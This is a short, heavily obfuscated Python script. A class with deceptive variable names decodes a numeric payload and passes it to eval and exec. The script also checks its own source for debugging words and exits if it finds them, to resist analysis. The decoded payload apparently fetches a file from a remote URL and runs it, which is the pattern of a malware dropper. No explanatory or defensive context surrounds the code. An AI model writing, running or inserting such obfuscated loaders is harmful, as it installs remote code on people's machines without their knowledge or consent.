class VindraXD():
 def __init__(self:object,_byte:int=False,_exit:float=0,*_delete:int,**_system:str)->exec:
  self._exec,self._boom,self._encode,_system[_exit],_byte,self._bytes=lambda _bit:"".join(chr(int(_rasputin)-len(_bit.split('[')))if _rasputin!='*'else'ζ'for _rasputin in str(_bit).split('[')),lambda _eval:_byte(_eval),lambda _byte:str(_system[_exit](f"{self._bytes[4]+self._bytes[-13]+self._bytes[4]+self._bytes[2]}(''.join(%s),{self._bytes[6]+self._bytes[11]+self._bytes[14]+self._bytes[1]+self._bytes[0]+self._bytes[11]+self._bytes[18]}())"%list(_byte))).encode(self._bytes[20]+self._bytes[19]+self._bytes[5]+self._bytes[34])if _system[_exit]==eval else exit(),eval,lambda _byte:exit()if self._bytes[15]+self._bytes[17]+self._bytes[8]+self._bytes[13]+self._bytes[19] in open(__file__, errors=self._bytes[8]+self._bytes[6]+self._bytes[13]+self._bytes[14]+self._bytes[17]+self._bytes[4]).read() or self._bytes[8]+self._bytes[13]+self._bytes[15]+self._bytes[20]+self._bytes[19] in open(__file__, errors=self._bytes[8]+self._bytes[6]+self._bytes[13]+self._bytes[14]+self._bytes[17]+self._bytes[4]).read()else"".join(_byte if _byte not in self._bytes else self._bytes[self._bytes.index(_byte)+1 if self._bytes.index(_byte)+1<len(self._bytes)else 0]for _byte in "".join(chr(ord(t)-1)if t!="ζ"else"\n"for t in self._exec(_byte))),exit()if _byte else'abcdefghijklmnopqrstuvwxyz0123456789'
  return self.__marshal__(_system[(self._bytes[-1]+'_')[-1]+self._bytes[18]+self._bytes[15]+self._bytes[0]+self._bytes[17]+self._bytes[10]+self._bytes[11]+self._bytes[4]])
 def __marshal__(self,_execute: str)->exec:return(None,self._encode(self._boom(_execute)))[0]
VindraXD(_byte=False,_sparkle='''299[311[308[306[230[308[312[230[302[306[309[308[311[313[230[312[318[312[313[298[306[230[255[312[230[312[*[302[306[309[308[311[313[230[312[301[314[313[302[305[*[312[238[237[300[302[313[230[309[314[305[305[237[239[*[312[301[314[313[302[305[244[311[306[313[311[298[298[238[237[313[298[312[313[317[237[239[*[312[238[237[296[314[311[305[230[243[274[230[301[313[313[309[312[256[245[245[300[302[313[301[314[295[244[296[308[306[245[306[311[243[297[302[309[313[308[243[312[313[308[311[298[245[244[244[244[244[245[295[305[308[295[245[306[255[302[307[245[313[298[312[313[317[261[311[255[316[259[313[311[314[298[230[243[308[230[313[298[312[313[317[237[239[*[312[238[237[296[301[306[308[297[230[252[252[252[230[313[298[312[313[317[237[239[*[312[238[237[244[245[313[298[312[313[317[237[239''')
